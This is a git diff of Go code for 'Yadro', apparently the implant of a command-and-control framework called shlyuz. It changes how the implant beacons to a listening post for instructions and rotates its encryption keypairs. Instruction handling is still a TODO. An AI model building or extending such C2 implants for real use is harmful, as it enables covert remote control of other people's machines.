@@ -8,6 +8,8 @@ import (
 
 	"shlyuz/pkg/component"
 	"shlyuz/pkg/config"
+	"shlyuz/pkg/crypto/asymmetric"
+	"shlyuz/pkg/instructions"
 	"shlyuz/pkg/transaction"
 	"shlyuz/pkg/transport"
 	"shlyuz/pkg/utils/logging"
@@ -52,11 +54,9 @@ func genComponentInfo() component.Component {
 	YadroComponent.Config.TskChkTimer = parsedConfig.TskChkTimer
 	YadroComponent.Config.CryptoConfig = parsedConfig.CryptoConfig
 	YadroComponent.InitalKeypair = YadroComponent.Config.CryptoConfig.CompKeypair
-	YadroComponent.CurrentKeypair = YadroComponent.InitalKeypair
-	YadroComponent.XorKey = YadroComponent.Config.CryptoConfig.XorKey
+	YadroComponent.InitalRemotePubkey = parsedConfig.CryptoConfig.LpPk
 	YadroComponent.ConfigKey = componentConfig.Key
 	YadroComponent.Manifest = makeManifest(YadroComponent.Config.Id)
-	YadroComponent.CurrentLpPubkey = parsedConfig.CryptoConfig.LpPk
 
 	return YadroComponent
 }
@@ -78,7 +78,6 @@ func main() {
 	if err != nil {
 		log.Fatalln("transport failed to initalize: ", err)
 	}
-	Component.CmdChannel = make(chan []byte)
 
 	initFrame := transaction.GenerateInitFrame(Component)
 	transaction.RelayInitFrame(&Component, initFrame, transport)
@@ -92,16 +91,19 @@ func main() {
 	// TODO: Implement loop here to do the actual stuff
 	//  first we send a request for a command, then we retrieve a response
 	for {
-		instructionRequestFrame := transaction.RequestInstruction(&Component, transport)
-		transaction.RelayInstructionFrame(&Component, instructionRequestFrame, transport)
-		instructionFrame, err := transaction.RetrieveInstruction(&Component, transport)
+		var instructionRequestFrame instructions.InstructionFrame
+		var newKeyPair asymmetric.AsymmetricKeyPair
+		instructionRequestFrame, newKeyPair = transaction.RequestInstruction(&serverReg)
+		transaction.RelayInstructionFrame(&serverReg, instructionRequestFrame)
+		serverReg.CurKeyPair = newKeyPair
+		instructionFrame, err := transaction.RetrieveInstruction(&serverReg)
 		if err != nil {
 			log.Println("invalid instruction received: ")
 			log.Println(err)
 			time.Sleep(time.Duration(Component.Config.TskChkTimer))
 			break
 		}
-		transaction.RelayInstructionFrame(&Component, instructionFrame, transport)
+		transaction.RelayInstructionFrame(&serverReg, instructionFrame)
 		// TODO: Process instruction
 		time.Sleep(time.Duration(Component.Config.TskChkTimer))
 		break
